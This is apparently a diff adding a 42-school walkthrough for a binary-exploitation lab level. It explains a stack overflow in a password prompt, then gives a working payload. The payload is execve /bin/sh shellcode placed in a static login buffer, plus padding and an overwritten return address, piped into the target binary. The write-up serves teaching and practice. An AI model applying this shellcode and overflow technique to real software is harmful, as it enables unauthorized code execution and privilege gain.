@@ -1,0 +1,37 @@
+# **************************************************************************** #
+#                                                                              #
+#                                                         :::      ::::::::    #
+#    walkthrough                                        :+:      :+:    :+:    #
+#                                                     +:+ +:+         +:+      #
+#    By: lgarczyn <lgarczyn@student.42.fr>          +#+  +:+       +#+         #
+#                                                 +#+#+#+#+#+   +#+            #
+#    Created: 2019/05/13 23:04:54 by lgarczyn          #+#    #+#              #
+#    Updated: 2019/05/14 00:30:58 by lgarczyn         ###   ########.fr        #
+#                                                                              #
+# **************************************************************************** #
+
+There's a possible stack overflow in the password input prompt.
+
+We trun a test string:
+
+> Enter Password:
+> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234567890-qweyhn jkcahd[...]
+
+We get the segfault on "0x79657771", or "yewq", which is "qwey" because of endianness
+
+Because the login is stored in a static address, we can store a shellcode there easily
+
+GDB tells the address is 0x0804A040, or 0x0804A047 after the login
+
+We insert a shellcode after the first prompt, then redirect to it using the overflow
+
+
+rm /tmp/l1
+# login prompt
+echo -e -n "dat_wil" >> /tmp/l1
+echo -e "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" >> /tmp/l1
+# password prompt
+echo -e -n "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" >> /tmp/l1
+echo -e "\x47\xa0\x04\x08" >> /tmp/l1
+
+cat /tmp/l1 - | ./level01
